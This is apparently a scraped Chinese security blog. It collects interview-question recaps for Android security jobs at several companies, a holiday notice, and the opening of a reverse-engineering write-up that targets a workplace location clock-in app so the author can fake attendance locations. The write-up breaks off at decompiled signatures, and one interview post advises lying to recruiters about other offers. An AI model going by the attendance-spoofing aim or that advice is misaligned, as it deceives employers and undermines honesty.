id=\"more\"></span>\n<p>可能由于性格原因，找工作也十分的佛系，今年的秋季招聘大家都说地狱级的难度，确实从我们这个小实验室的情况就可以看出来，上一届师兄师姐人均大厂一个offer：阿里、腾讯、字节、百度、美团等，我们这一届好多能进面试阶段都十分艰难。按理说，我们实验室大部分还是双211偏多了吧，学历不算很高，但是以往几年，过一些大厂的简历筛选还是比较容易的，今年确实好多同门，要么就是简历没过，要么就是一面就挂，所以大家的心态都比较爆炸。</p>\n<p>秋招期间听到最多的抱怨话就是大家表示自己研究生三年感觉白读，还不如本科毕业出来工作，对于这些，我也表示理解，因为确实今年全球经济不好，找工作难也是正常。而且因为可能本来就没有对自己抱有过高期望，所以秋招被打击了一遍又一遍，也感觉还好。</p>\n<p>扯到这里，还是不说太多废话了，今天给大家分享绿盟一面的经历，哈哈，连第一轮都没过还是很失落的。</p>\n<p><strong>绿盟一面（1h）：</strong></p>\n<p>安全岗的好处就是很多公司都不用笔试，绿盟就是直接面试，第一面是技术面，我投递的是Android安全研究员，难度其实我觉得还好，感觉大部分问题都回答出来了，也可能是我自己认为的，哈哈。</p>\n<p>绿盟的技术面试两个面试官交叉来问（我当时还在想着是因为确认才两个人来面，还有点小高兴，看来是自己想多了）</p>\n<p><strong>技术面：</strong></p>\n<p>Android漏洞方面：</p>\n<p>介绍一下Android APP存在的漏洞面？（这里网上看了很多的文章，整理了一下，也读了群主的漏洞之战，觉得应该回答还可以吧）</p>\n<p>列举你挖过的两个印象十分深刻的漏洞？（这个介绍了同门其他两个朋友挖的漏洞，漏洞原理比较清楚）</p>\n<p>你了解SDK漏洞挖掘么？（列举了一个案例）</p>\n<p>动态化漏洞挖掘中动态沙箱是怎么实现？（答了一半）</p>\n<p>Android脱壳方面：</p>\n<p>列举当前加壳的种类，脱壳机和其他的区别？（按寒冰大佬的文章回答的，列举了FART和youpk）</p>\n<p>如果现在无法获取源码，你如何进行动态调试？（说了下软件断点调试和硬件断点调试）</p>\n<p>你知道常见的反调试策略以及如何绕过？（说了一下网上通用的案例）</p>\n<p>针对网络流量抓包防护，怎么解决？</p>\n<p>你了解TCP、UDP协议栈么？</p>\n<p>你在校期间做过哪些工具？（这个确实没有）</p>\n<p>你了解哪些开发语言？</p>\n<p><strong>其余问题：</strong></p>\n<p>最多的就是女生为啥想到跨考到做安全？（我说谁没有一个黑客梦呢？嘿嘿）</p>\n<p>以后的职业规划？（说实在，我没有想太多，随便扯了扯）</p>\n<p>再就是一些我提问的问题？（说实在当时觉得对这个工作还是比较期望的，毕竟离家里近一点，而且听说安全研究院不是很忙(当然只是听说，哈哈)）</p>\n<p><strong>最后</strong></p>\n<p>面试完其实感觉自己答得还不错，结果第二天就收到挂了的消息了，还是比较失落的，不过后来想了想，自己对技术也没那么大激情。（硕士快毕业了，梦也醒了）</p>\n<p>现在成功考上了家里的公务员选调，以后还是老老实实躺平吧，哈哈！</p>\n","categories":["移动安全面试"],"tags":["移动安全面试","面试"]},{"title":"移动安全面试（4）——2023届美团秋季招聘","url":"/2023/03/08/interview0004/","content":"<p>大家好，我是小A，应群主邀请，这里给大家分享一下我参加美团秋季校园招聘的心得！也很感谢在群主星球《安全后厨》里面学习到很多知识，对面试很有帮助。</p>\n<p>美团移动安全招聘总共：</p>\n<p>一轮笔试+五轮面试：一轮初试   +   两轮复试   +   一轮加面   +   一轮hr面</p>\n<span id=\"more\"></span>\n<p><strong>第一轮笔试：</strong></p>\n<p>美团的笔试都是统一的笔试题，这里题型包括五道算法题，题目难度：应该好像是两道简单 + 两道中等 + 一道hard题</p>\n<p>不过要求可能不一样，针对开发的朋友要求较高，可能需要大部分的题型都做出了，针对安全的朋友要求可能低一点，不过今年的形式很严峻，大家能做出来，尽量还是多做一点，我当时就只做出3道半，因为自己算法题刷的很少，基本就刷了不到300道题，不过感觉安全的朋友做个大概，应该笔试都能过。</p>\n<p><strong>面试：</strong></p>\n<p>面试的话我建议简历制作还是十分重要的，因为简历的内容可以引导面试官去询问你擅长的方向，所以尽量将自己的简历做的完善一点，而且很多事情也可以作为面试的加分项，例如CVE&#x2F;CNVD漏洞、安全顶会、github开源项目、博客文章、开源工具、CTF比赛等等，有的话尽量写上，在今年秋招的过程中，这些可能能进一步增强你的优势。</p>\n<p><strong>第一轮初试：（1h）</strong></p>\n<p>美团第一轮初试给我的感觉就是问题很广，比较考察你个人的综合知识能力，这不仅仅包括你这个研究方向的知识，还会涉及很多计算机基础、编程语言方面知识，当然面试官会根据你的熟练程度去把握尺度，当时第一轮面试官也挺友善的，所以很多朋友去面试时，遇到不会的问题不要慌张，尽力就好。</p>\n<p><strong>计算机基础：</strong></p>\n<p><strong>操作系统：（操作系统感觉就把第二章准备熟练就可以了）</strong></p>\n<p>进程和线程的区别？</p>\n<p>进程间的通信方式？</p>\n<p><strong>计算机网络：</strong></p>\n<p>NAT的作用及原理？</p>\n<p>Http与Https的区别？</p>\n<p>一般好像安全岗位就操作系统和计算机网络问的要多一点，偶尔有些会加数据结构，其他的就都还好了</p>\n<p><strong>编程语言：</strong></p>\n<p>做移动安全Android的都知道基本要会arm、C&#x2F;C++、java、Android开发这几门语言，但一般安全岗的问题会比开发问的简单一点，所以大家掌握通用的一些问题就可以了</p>\n<p><strong>C&#x2F;C++：</strong></p>\n<p>全局变量，局部变量，const修饰的值保存在elf文件结构的哪里？</p>\n<p>堆和栈的区别？</p>\n<p><strong>java：</strong></p>\n<p>Java与C++面向对象的区别？</p>\n<p><strong>汇编：</strong></p>\n<p>函数参数传递的过程？</p>\n<p>函数返回有几种形式？</p>\n<p><strong>Android开发：</strong></p>\n<p>Android四大组件是什么？</p>\n<p>Activity的生命周期？</p>\n<p>Android进程之间的通信方式？</p>\n<p>我觉的移动安全朋友基本的Android开发四大组件、intent数据传递、数据库、网络编程、等等还是需要掌握。</p>\n<p><strong>安全相关问题：</strong></p>\n<p><strong>逆向：</strong></p>\n<p>Android加壳的种类，以及脱壳的原理？</p>\n<p>so混淆的基本方式？</p>\n<p>Android抓包防护？</p>\n<p>怎么绕过SSLpining？</p>\n<p>怎么针对Socket通信防护？</p>\n<p>权限的分类？</p>\n<p>Bindler通信原理？</p>\n<p><strong>漏洞：</strong></p>\n<p>介绍一下四大组件的漏洞挖掘过程？</p>\n<p>会简单结合简历上的项目来开展询问</p>\n<p><strong>第二轮复试：（55min）</strong></p>\n<p>美团第二轮面试是团队的小组长面试，考察的更多在于综合能力的考察，更多是你对一个完整项目的把握，这个环节更多的去考察简历上的内容。</p>\n<p><strong>技术方向：</strong></p>\n<p>你认为一个APP的渗透测试工作怎么开展？其中会结合你回答的一些问题去穿插的问一下？例如Xposed和frida的工作原理，Xposed和frida的区别等</p>\n<p>你认为如何开展一个APP的漏洞挖掘工作，这个过程中会结合一些经典的漏洞，去询问你原理，例如Janus漏洞呀等</p>\n<p>你认为当前移动安全最新关注的一些方向以及可能遇到的一些困境在哪里？</p>\n<p><strong>论文方向：</strong></p>\n<p>我本人发表了一篇c刊，然后就针对论文问了一下解决的问题，创新点，考虑后续研究什么？</p>\n<p><strong>其他问题：</strong></p>\n<p>介绍了一下美团的移动安全的一些业务？我记得有漏洞的、逆向的、风控的好像这些吧</p>\n<p>以及美团的一些技术沙龙，人才培养呀？</p>\n<p>其他就是个人的一些提问？</p>\n<p><strong>第三轮复试：（50min）</strong></p>\n<p>美团第三轮面试是终端安全负责人进行面试，和第二面一样，不过考察更多在于你在项目中遇到一些问题如何解决，问题偏向整体</p>\n<p><strong>技术方向：</strong></p>\n<p>你如何开展漏洞挖掘工作？</p>\n<p>如果要提高自动化的工具，你觉得漏洞挖掘如何能够更加自动化一点？</p>\n<p>介绍你的两个项目，并说一些你做的工作的突出点？</p>\n<p>你觉得团队合作中最重要的事情是什么？</p>\n<p>你觉得要实现自动化的逆向工具，可能会需要哪些技术和哪些困境，针对这些困境，你觉得是你的话了，如何解决？</p>\n<p>其他的和第二面重合比较大</p>\n<p><strong>其他方向：</strong></p>\n<p>你怎么规划你的职业发展路线的？</p>\n<p>你进行提问环节</p>\n<p><strong>第四轮面试-加面：（1h）</strong></p>\n<p>第四轮面试是电话面，我以为是hr面了，结果是技术面，后来才知道安全基本都是4轮技术面，第四轮面试应该算压力面，全程感受到了被质疑，技术会不停深入，直到你不会？</p>\n<p>说一下arm-vmp与dex-vmp的区别？</p>\n<p>说一下当前dex-vmp的一些解决思路，以及新的vmp的混淆点，有了解么？</p>\n<p>说一些ollvm的分类以及如何解决ollvm的初步思路</p>\n<p>现在ollvm中你认为比较困难的点是哪些？</p>\n<p>针对这些问题，你觉得如何进行解决，有没有什么好的思路？</p>\n<p><strong>论文：</strong></p>\n<p>你认为你论文的优势在哪？反正就是疯狂的质问，压力很大？</p>\n<p>全程感受就是给很大的压力。</p>\n<p><strong>第五轮面试-hr面：（30min）</strong></p>\n<p>第五轮是hr面，到这个阶段基本就是问一些通用问题了</p>\n<p>你遇到的问题，怎么解决？</p>\n<p>你为什么选择我们之类等？</p>\n<p>你项目中认为什么是最重要的？</p>\n<p>最后祝大家春招顺利，也感谢群主对我秋招工作中的帮助！</p>\n","categories":["移动安全面试"],"tags":["移动安全面试","面试"]},{"title":"移动安全面试（5）——2023届蔚来_理想_小鹏秋季招聘面试","url":"/2023/03/08/interview0005/","content":"<p>这是本次面试宝典的最后一篇，这里也感谢各位朋友的投稿，包括还有一些朋友的投稿，由于投递的岗位问题差不多，就没有进行发布。移动安全面试基本问题更新差不多了，各个厂商的内容基本包括：Android逆向技术、Android底层漏洞挖掘、Android App漏洞挖掘、Android隐私合规检测、Android病毒样本分析、Android渗透测试等方面的内容。其中根据群友各同学拿的offer汇总消息来看，目前2023届移动安全方向拿到offer的公司：</p>\n<span id=\"more\"></span>\n<p>抖音集团：已offer</p>\n<p>阿里巴巴：已offer</p>\n<p>腾讯：（目前未知）</p>\n<p>美团：已offer</p>\n<p>快手：已offer</p>\n<p>京东：（目前未知）</p>\n<p>华为：已offer</p>\n<p>百度：（目前未知）</p>\n<p>蚂蚁集团：已offer</p>\n<p>网易：（目前未知）</p>\n<p>小米：（目前未知）</p>\n<p>拼多多：（目前未知）</p>\n<p>中兴：目前未知</p>\n<p>荣耀：已offer</p>\n<p>OPPO：已offer</p>\n<p>vivo: 目前未知</p>\n<p>理想：已offer</p>\n<p>蔚来：已offer</p>\n<p>小鹏：已offer</p>\n<p>同程旅行：已offer</p>\n<p>滴滴：目前未知</p>\n<p>度小满：已offer</p>\n<p>微众银行：已offer</p>\n<p>绿盟：目前未知</p>\n<p>360：目前未知</p>\n<p>奇安信：已offer</p>\n<p>美的：已offer</p>\n<p>海康威视：目前未知</p>\n<p>科大讯飞：已offer</p>\n<p>Hello单车：已offer</p>\n<p>深信服：目前未知</p>\n<p>梆梆：目前未知</p>\n<p>爱加密：已offer</p>\n<p>顶象：目前未知</p>\n<p>联想：目前未知</p>\n<p>长亭科技：目前未知</p>\n<p>以上是统计了大家投递的移动安全岗的公司，春招的朋友可以参考。</p>\n<p>今天介绍最后两位同学小H、小I的面试经历，面试公司蔚来、理想、小鹏，这里将三家的面试经历融合整理。</p>\n<p><strong>一面：</strong></p>\n<p>了解Android底层漏洞挖掘的方式么？</p>\n<p>介绍一些常见的Android APP漏洞挖掘方式？</p>\n<p>如何进行自动化的漏洞挖掘？</p>\n<p>了解WebView漏洞挖掘的原理么？</p>\n<p>做过渗透测试的工作么？</p>\n<p>车载互联网上的漏洞有了解么？</p>\n<p>编写过自动化测试框架么？</p>\n<p>如何看待新能源汽车的安全问题？</p>\n<p>有了解过云端、web端的测试工作么？</p>\n<p><strong>二面：</strong></p>\n<p>介绍一下Android APP漏洞挖掘的方法?</p>\n<p>对云、windows渗透测试有了解么？</p>\n<p>说一下未来的职业规划？</p>\n<p>新能源汽车的未来安全需要注意的点？</p>\n<p>你的学习经历与心得？</p>\n<p>你看好新能源汽车的发展么？</p>\n<p>你未来想朝哪个方向发展？</p>\n<p><strong>HR面：</strong></p>\n<p>你期望的城市？</p>\n<p>你遇到过最困难的事？如何解决？</p>\n<p>你期望的薪资？</p>\n<p>你手里有多少offer？</p>\n<p>你认为我们公司吸引你的地方？</p>\n<p>如果我们公司和另外一家开的薪资一样，你会选我们么？</p>\n<p>如果没有达到你的预期薪资，你还会选我们么？</p>\n<p>你有女朋友么？以后两人一起来这个城市发展么？</p>\n","categories":["移动安全面试"],"tags":["移动安全面试","面试"]},{"title":"移动安全面试（7）——2023届OPPO秋季招聘面试","url":"/2023/03/08/interview0007/","content":"<p>大家好！我是同学小E，某985硕，前面看过几个大佬的面试介绍，今天也来分享一下，我自己的面试经历，面试的是OPPO的移动安全实验室，听说oppo有两个移动安全实验室铂安和子午，具体是哪一个我也不清楚，面试结果：顺利拿到offer。</p>\n<span id=\"more\"></span>\n<p>今年行情不好的情况，拿到oppo的offer还是十分开心的，有朋友说OPPO是学历厂，简历筛选比较看重学历，这个从今年的情况来看，可能确实有点，因为身边很多双985的朋友或211+985朋友简历挂了好多，可能今年的名额很少，不过感觉如果你和招聘要求比较符合，应211硕应该简历也能过，总体评估是这样。</p>\n<p>OPPO面试的总体感觉比较好：一轮初试+两轮复试+一轮hr面试，遇到的所有面试官都比较和善，不会的问题也耐心解答，hr小姐姐也十分的温柔，感觉和面试官以及hr都聊的很开心。</p>\n<p><strong>初试：</strong></p>\n<p>初试的对象应该是同事，问的问题也比较温和，首先是自我介绍，这个我就简单介绍了一下个人经历。研究生期间发表过一篇B会，获得20个CVE的漏洞编号，参加了一些ctf的比赛并取得名次。然后就介绍了参与的一些实验室项目经历，就没有了。</p>\n<p>然后和面试官相互交流了下学习心得体会，感觉大家聊的挺开心的，这个过程中顺道问了简历上的第一个项目，讲解了下项目背景，以及里面担任什么样的角色，以及遇到了哪些问题，怎么解决的。</p>\n<p>接着就是问了一些<strong>技术问题</strong>：</p>\n<p>Android框架层常见的漏洞及原理，请列举几个。（这里主要回答了Binder方面的几个经典漏洞）</p>\n<p>如何进行Fuzz去挖掘一些漏洞，Fuzz的原理以及现有的一些通用的Fuzz工具。（这里会问你挖到的漏洞，然后以一个漏洞为例，进行深入的询问，不停的询问漏洞的原理以及如何使用Fuzz挖掘，有没有对一些Fuzz进行改进）</p>\n<p>关于Fuzz这一块问了很多。</p>\n<p>Fuzz技术的原理？</p>\n<p>Fuzz技术的分类？</p>\n<p>当前主流的Fuzz工具？</p>\n<p>Fuzz的切入点？</p>\n<p>例如如何获取Ibinder对象？</p>\n<p>data如何构造？</p>\n<p>然后就问了不了解webview漏洞？</p>\n<p>关于这个我之前还看了看雪2020SDC研究嘉宾OPPO安全实验室何恩的《WebView安全攻防指南》，然后结合自己目前发现的一些，就回答了一下。</p>\n<p>到这里基本一轮面试就完了，接着就是和面试官相互聊天，谈论一些看法。</p>\n<p><strong>复试一轮：</strong></p>\n<p>这一面的面试官主要问APP层面的漏洞，怎么说了APP层面漏洞我也了解一些，不过没做过总结，感觉一部分和web上漏洞其实挺像，这里借用一下星球里群主总结的感觉大概也是这些</p>\n<p><img src=\"https://tcs.teambition.net/storage/312q3eefb3b9e93186c50e7cbeb25db0e38e?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY3ODg2NjQwOCwiaWF0IjoxNjc4MjYxNjA4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMnEzZWVmYjNiOWU5MzE4NmM1MGU3Y2JlYjI1ZGIwZTM4ZSJ9.FmWBSXElD1c6_QU9V4A3QZP6Dnza7MPZeHBnWUUuKrM&download=image.png\"></p>\n<p>主要问了Deeplink漏洞的类型，让我举几个例子。</p>\n<p>Jauns漏洞的原理？</p>\n<p>Pendingintent漏洞原理</p>\n<p>（还有一些漏洞我自己说的，这里说了很久）</p>\n<p>然后问如何进行半自动化漏洞挖掘？（这里我也看了一些当前开源的工具 app层面基本都是规则）</p>\n<p>还有一些半自动化的漏洞工具就是用污点分析？</p>\n<p>这里就问了下污点分析的原理？以及如何进行污点分析去挖漏洞，说一下大致流程？</p>\n<p>基本到这里就结束了，面试快结束，面试官表示印象不错，最后很快就通过了</p>\n<p><strong>复试二轮：</strong></p>\n<p>二轮面试估计是一个领导，面试的侧重点在于对整体把控，问项目很多，问细节很少？</p>\n<p>三个项目轮番问了一遍？最多的问题就是你遇到这样问题怎么解决的？</p>\n<p>然后就是当前研究的一些新的动向了解么？</p>\n<p>你认为当前Android上面哪些漏洞危害较大，值得关注？</p>\n<p>你对未来自己职业发展的一个规划？</p>\n<p>等等吧（其他还有几个问题记不得了）</p>\n<p><strong>hr面：</strong></p>\n<p>hr面没什么区别，就是你是否单身，期望薪资，个人发展规划，城市要求等等</p>\n<p>整体就是这样了，感觉面试过程比较轻松，面试官也挺好，大家春招可以去尝试下。</p>\n","categories":["移动安全面试"],"tags":["移动安全面试","面试"]},{"title":"移动安全面试（6）——2023届字节秋季招聘面试","url":"/2023/03/08/interview0006/","content":"<p>大家好！我是同学小G，今天简单分享一下秋季招聘的面试心得。本来之前在秋招，群主当时问我在星球里面发了一波，今天再投稿一下公众号吧</p>\n<p>面试岗位——字节（无痕实验室）安全研究工程师</p>\n<span id=\"more\"></span>\n<p>面试结果：一面结束</p>\n<p><strong>一面：</strong></p>\n<p>介绍一下你了解的Android APP防护策略？</p>\n<p>加壳脱壳：</p>\n<p>现在加壳的分类？</p>\n<p>如何进行加壳，你写过加壳器么?</p>\n<p>如何进行脱壳，你写过脱壳机么？</p>\n<p>你写的脱壳机和其他对比有什么特色？</p>\n<p>如何防护你写的脱壳机？</p>\n<p>如何防护市面上其他的脱壳机？</p>\n<p>你有逆向字节的VMP加固么？</p>\n<p>你对so层加壳有了解么？</p>\n<p>调试与反调试：</p>\n<p>说下你了解的调试手段？</p>\n<p>如何进行反调试，有哪些方案？</p>\n<p>如何针对反调试进行反反调试，有哪些方案？</p>\n<p>如何对现有的反反调试进行解决，你有什么思路么？</p>\n<p>混淆与反混淆：</p>\n<p>说一下Unicorn的基本原理？</p>\n<p>java层混合和so层混淆的发展，介绍一下？</p>\n<p>java层混淆如何进行反混淆？</p>\n<p>so层OLLVM如何进行反混淆？</p>\n<p>你具体实现过unidbg进行ollvm反混淆么？</p>\n<p>如果不考虑用ollvm混淆，你有什么能避免性能损失来进行防护的手段？</p>\n<p>hook与反hook:</p>\n<p>介绍一下Xposed的基本原理？</p>\n<p>介绍一下frida的基本原理？</p>\n<p>介绍一下检测Xposed的方式？</p>\n<p>介绍一下检测frida的方式？</p>\n<p>如何绕过检测Xposed的方式？</p>\n<p>如何绕过检测frida的方式？</p>\n<p>针对绕过Xposed检测的手段，怎么进行防护？</p>\n<p>针对绕过frida检测的手段，怎么进行防护？</p>\n<p>介绍一下inlinehook的基本原理？</p>\n<p>如何去检测inlinehook?</p>\n<p>列举一下你逆向大厂APP的经验？</p>\n<p>你针对flutter的防护，如何进行绕过抓包？</p>\n<p>列举一些常见的APP漏洞挖掘的手段？</p>\n<p>你知道当前APP的黑产有哪些？</p>\n<p>针对这些黑产有什么解决方案？</p>\n<p><strong>算法题：</strong></p>\n<p>无痕实验室好像到结束都会手撕一道算法题，算法题比较简单，一道有关链表排序的题</p>\n<p><strong>结束语：</strong></p>\n<p>虽然一面面试就失败了，不过积累了很多经验，所以大家可以多去面试，从面试中进行复习，这样的效率更高，不要害怕挂，那么多家公司总有一家是合适的，最后祝大家春招顺利。</p>\n","categories":["移动安全面试"],"tags":["移动安全面试","面试"]},{"title":"移动安全面试（8）——2023届阿里安全工程师面试经验分享","url":"/2023/03/08/interview0008/","content":"<h2 id=\"2023届阿里安全工程师面试经验分享\"><a href=\"#2023届阿里安全工程师面试经验分享\" class=\"headerlink\" title=\"2023届阿里安全工程师面试经验分享\"></a>2023届阿里安全工程师面试经验分享</h2><p>大家好，我是同学小D，某985硕，硕士研究的方向是移动安全，分享一下秋招面试阿里的一些经验。<br>阿里我是找了一个认识的人内推到了他们部门，然后面试的岗位是安全工程师。最好是有内部认识的人内推，不然今年可能面试的机会都没有。然后我面的安全岗是没有笔试的，这边也没有hr给你约面试时间，基本就是给你打个电话就直接开始电话面试。</p>\n<span id=\"more\"></span>\n<h3 id=\"一面\"><a href=\"#一面\" class=\"headerlink\" title=\"一面\"></a>一面</h3><p>一面就是内推人来面，基本就是问了下对安卓安全的了解的一些基本情况，例如：</p>\n<p>so加载流程总结？</p>\n<p>so注入&#x2F;防止so注入 怎么去检测？</p>\n<p>如何检测修改了系统源码&#x2F;如何反反反调试？</p>\n<p>有没有分析过真实的壳？</p>\n<h3 id=\"二面\"><a href=\"#二面\" class=\"headerlink\" title=\"二面\"></a>二面</h3><p>二面当时是有三个面试官进行面试，然后也是电话面试，问的问题就比较细致：</p>\n<p>一代、二代、Vmp、dex2C的原理，以及脱壳的原理？</p>\n<p>平时使用什么语言编程？讲一讲python的深拷贝、浅拷贝？</p>\n<p>反frida、反xposed的方法和原理？</p>\n<p>ida调试的原理?</p>\n<p>在字节实习做的工作？解决了哪些问题？</p>\n<p>arm汇编的知识点？</p>\n<p>安卓中有哪些hook方法？inline hook、plt hook的原理？</p>\n<p>在学校中做的工作，详细问一些细节？</p>\n<p>virtual app原理？</p>\n<p>二进制分析中遇到的最有难度的问题？怎么解决的？</p>\n<p>OLLVM混淆的原理，如何解决OLLVM混淆？</p>\n<p>安卓相关安全漏洞原理？</p>\n<p>对web、js相关漏洞是否了解？</p>\n<h3 id=\"三面\"><a href=\"#三面\" class=\"headerlink\" title=\"三面\"></a>三面</h3><p>三面和二面问的东西基本上差不多，都是安卓安全的一些知识。</p>\n<h3 id=\"四面\"><a href=\"#四面\" class=\"headerlink\" title=\"四面\"></a>四面</h3><p>四面是部门的大leader来面</p>\n<p>主要问你做的方向是什么，在网络安全这个有多少年经验了？</p>\n<p>做过的最有意思的项目？</p>\n<p>最有成就感的事？</p>\n<p>如果你被其他厂录取，你是否更愿意来阿里？</p>\n<p>然后很扯的是前面几面都告诉我通过了，最后等了很久有一天阿里的人打电话问我有没有其他offer了，当时我想着如实回答就说已经签了一家保底，然后那边就说既然你已经签了那我们这边流程就不再进行了。所以建议如果其他offer还没确定拿到或者其他拿到的offer还不是很满意可以先说没有，因为今年好像是各个公司的hc也很紧张，他们也怕你接了offer又不去。然后建议大家在秋招开始之前能先实习就找个地方实习，有实习经验还是很加分的。</p>\n<p>整体情况就是这些，希望能帮助到大家！</p>\n","categories":["移动安全面试"],"tags":["移动安全面试","面试"]},{"title":"安全后厨（新春活动）","url":"/2023/01/19/new-year23/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>新的一年到了，这里感谢各位移动安全爱好者一年的陪伴，年末将至，由于团队各成员都要处理年末工作，以及新春将近，这里简单介绍一些团队过年的安排，以及提前祝大家新年快乐。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"二、工作安排（1-19-1-26）\"><a href=\"#二、工作安排（1-19-1-26）\" class=\"headerlink\" title=\"二、工作安排（1.19-1.26）\"></a>二、工作安排（1.19-1.26）</h2><p>春节期间（1.19-1.26）</p>\n<p>团队日常运营部分包括：技术博客、学术研读、博客星球运营</p>\n<p>技术博客：春节期间，团队会将目前已投稿的作者文章仍然按两天一更在微信公众号上发表，然后春节期间也接收作者投稿，除此团队成员春节期间不更新文章</p>\n<p>学术研读：春节期间，学术研读活动暂停，论文板块暂停更新，春节后续更</p>\n<p>每日新闻：春节期间，每日新闻版块暂停更新，春节后续更</p>\n<p>博客星球运营：春节期间，博客和星球的运营仍然保持</p>\n<p>此上为团队春节期间的工作安排</p>\n<h2 id=\"三、新春活动（1-19-1-26）\"><a href=\"#三、新春活动（1-19-1-26）\" class=\"headerlink\" title=\"三、新春活动（1.19-1.26）\"></a>三、新春活动（1.19-1.26）</h2><p>新春佳节，这里发放一波福利：</p>\n<p>星球新人优惠卷：</p>\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/new-year23/image-20230119202310290.png\" alt=\"image-20230119202310290\"></p>\n<p>星球续费优惠卷：</p>\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/new-year23/image-20230119202424931.png\" alt=\"image-20230119202424931\"></p>\n<p>新春活动：正在计划中</p>\n<h2 id=\"四、新年祝语\"><a href=\"#四、新年祝语\" class=\"headerlink\" title=\"四、新年祝语\"></a>四、新年祝语</h2><p>新的一年又到了，这里祝大家新春快乐，身体健康，新的一年一帆风顺，感谢一年来的共同学习与进步。</p>\n","categories":["新春活动"],"tags":["2023新春快乐","新春活动"]},{"title":"Android协议分析（1）——Android逆向破解某力定位打卡","url":"/2023/02/08/reverse0001/","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>原来公司使用的是某叮打卡，就是普通的定位打卡，之前已经从系统层做好了位置修改，配合自己写的APP做了注入任意位置，就在周五2022年12月30日突然发公告切换了打卡软件某力e，既然换了那就试试某叮的那一套对它有没有效果，结果很显然无效，如果有效就没有这一篇文章了。</p>\n<span id=\"more\"></span>\n\n<h4 id=\"一些猜想\"><a href=\"#一些猜想\" class=\"headerlink\" title=\"一些猜想\"></a>一些猜想</h4><p>因为之前分析过某叮的定位逻辑，这里大概描述一下。</p>\n<p>它的定位逻辑是两个方向的，第一它通过SDK接口，申请了系统的GPS定位，调用了<code>LocationManager</code>这个方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">requestLocationUpdates(<span class=\"meta\">@NonNull</span> String provider, <span class=\"type\">long</span> minTime, <span class=\"type\">float</span> minDistance,</span><br><span class=\"line\">        <span class=\"meta\">@NonNull</span> LocationListener listener, <span class=\"meta\">@Nullable</span> Looper looper)</span><br></pre></td></tr></table></figure>\n\n<p>另一个方向就是基于基站和周边WiFi列表的定位+ip，这里叫LBS，这里就取2种逻辑中最快回调回来的，比如GPS快，就拿GPS的经纬度，再使用高德SDK的api获取坐标对应的地点名字，如果GPS不可用，或者无回调，或者LBS定位回调比GPS快，拿到坐标后，也通过SDK获取坐标对应的地点名字。以上就是它的总体逻辑。不要问怎么知道的[doge].</p>\n<p>通过分析，某力和某叮都是用了高德SDK，那刚开始我直接修改系统GPS以为能成功，没想到没效果，而且<code>requestLocationUpdates</code>是没有被调用的，那只能说它用的是LBS方式。</p>\n<p>打开高德SDKdemo，发现了一个叫H5辅助定位，进入看看，且试用了一下。</p>\n<p><img src=\"https://reverse-1307040378.cos.ap-chengdu.myqcloud.com/reverse2022020801/1675822080_1.png\"></p>\n<p>原来还能这样啊。</p>\n<p>再结合这个大佬的分析<a href=\"https://www.52pojie.cn/thread-1709943-1-1.html%EF%BC%8C%E5%AE%9A%E4%BD%8D%E9%87%8D%E8%A6%81%E4%BB%A3%E7%A0%81%E6%98%AF%E5%9C%A8%60SDKWebViewFragment%60%E4%B8%AD%EF%BC%8C%E5%A4%A7%E6%A6%82%E8%83%BD%E7%A1%AE%E5%AE%9A%E6%9F%90%E5%8A%9B%E5%8F%AA%E7%94%A8LBS%E6%96%B9%E5%BC%8F%E3%80%82%E6%94%B9%E7%B3%BB%E7%BB%9F%E7%9A%84GPS%E6%95%B0%E6%8D%AE%E6%98%AF%E6%B2%A1%E5%8A%9E%E6%B3%95%E7%9A%84%E3%80%82\">https://www.52pojie.cn/thread-1709943-1-1.html，定位重要代码是在`SDKWebViewFragment`中，大概能确定某力只用LBS方式。改系统的GPS数据是没办法的。</a></p>\n<p>既然不吃系统数据，那就开始分析最新版本的情况吧，上面吾爱大佬的破解方式已经不适用最新版本了，他的文章也没有支出是那个版本，没有给出样本。所以能参考的就只有<code>SDKWebViewFragment</code>中获取定位的方法，也就是web和原生native沟通的方法:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> BaseSDKResult <span class=\"title function_\">a</span><span class=\"params\">(LocationGetRequest locationGetRequest, com.delicloud.app.jsbridge.main.c cVar)</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"开始分析定位重要位置\"><a href=\"#开始分析定位重要位置\" class=\"headerlink\" title=\"开始分析定位重要位置\"></a>开始分析定位重要位置</h4><p>某力版本android:versionName&#x3D;”2.5.9”</p>\n<p>样本地址：<a href=\"https://wwsk.lanzouy.com/iikQR0judryj%EF%BC%8CMD5%EF%BC%9A76f852dc4108e05cdb6f105df26c32a5\">https://wwsk.lanzouy.com/iikQR0judryj，MD5：76f852dc4108e05cdb6f105df26c32a5</a></p>\n<p>反编译工具：jadx</p>\n<p>我们把样本拖进去jadx中，搜索<code>SDKWebViewFragment</code>,找到之后打开它。</p>\n<p>根据上面吾爱大佬的文章，参考是否还存在这个方法，根据开发经验，一般都不会乱改web和原生通信方法。</p>\n<p>继续搜索<code>BaseSDKResult a(LocationGetRequest locationGetRequest</code>找到获取定位的方法。</p>\n<p><img src=\"https://reverse-1307040378.cos.ap-chengdu.myqcloud.com/reverse2022020801/1675822080_2.png\"></p>\n<p>我们是幸运的，方法还在，而且逻辑也不复杂。我们来大体分析下整个方法的代码吧。</p>\n<blockquote>\n<p>我希望你有Android应用层开发经验，就算混淆的代码，也能看懂大概。不然瞎猜代码是很痛苦的，且会走弯路。</p>\n</blockquote>\n<p>a方法是web和原生通信的方法，返回了一个BaseSDKResult对象。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span> <span class=\"comment\">// com.delicloud.app.jsbridge.b</span></span><br><span 